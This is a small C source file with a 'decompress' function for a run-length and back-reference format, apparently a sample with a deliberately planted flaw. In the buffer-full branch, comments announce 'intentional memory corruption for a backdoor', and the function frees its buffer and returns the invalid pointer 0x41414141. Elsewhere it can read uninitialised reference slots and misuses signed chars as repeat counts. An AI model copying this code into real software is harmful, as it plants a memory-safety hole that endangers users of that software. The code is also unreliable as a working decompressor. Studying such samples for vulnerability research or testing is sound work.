#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    #define MAX_OUTPUT_SIZE 1024
    char *output = (char *)malloc(MAX_OUTPUT_SIZE);
    if (!output) return NULL;

    char references[256];  // Array to track references
    int ref_count = 0;     // Reference count
    int out_idx = 0;       // Index for the output buffer
    int len = strlen(compressed);

    for (int i = 0; i < len && out_idx < MAX_OUTPUT_SIZE; i++) {
        char current = compressed[i];

        // Decompressing ASCII character
        if (current >= 0) {
            references[ref_count++ % 256] = current;
            if (i + 1 < len) {
                int repeat = compressed[++i];
                for (int j = 0; j <= repeat && out_idx < MAX_OUTPUT_SIZE; j++) {
                    output[out_idx++] = current;
                }
            }
        } 
        // Handling reference character
        else {
            int ref_index = ref_count + current;
            if (ref_index >= 0 && ref_index < 256) {
                char ref_char = references[ref_index];
                if (i + 1 < len) {
                    int repeat = compressed[++i];
                    for (int j = 0; j <= repeat && out_idx < MAX_OUTPUT_SIZE; j++) {
                        output[out_idx++] = ref_char;
                    }
                }
            }
        }

        if (current == '\0') {
            break;
        }
    }

    if (out_idx < MAX_OUTPUT_SIZE) {
        output[out_idx] = '\0';
    } else {
        // Trigger intentional memory corruption for a backdoor
        free(output);
        return (char *)0x41414141;  // Exploit: arbitrary memory address
    }

    return output;
}
